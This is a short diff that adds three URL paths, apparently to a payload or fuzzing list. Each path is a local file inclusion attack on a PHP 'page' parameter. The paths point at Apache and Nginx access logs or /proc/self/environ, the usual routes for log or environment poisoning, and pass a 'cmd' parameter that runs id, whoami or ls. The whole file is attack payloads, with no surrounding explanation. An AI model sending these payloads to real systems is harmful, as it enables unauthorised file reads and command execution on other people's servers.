@@ -1,0 +1,3 @@
+/index.php?page=/var/log/apache2/access.log&cmd=id
+/index.php?page=/proc/self/environ&cmd=whoami
+/index.php?page=/var/log/nginx/access.log&cmd=ls
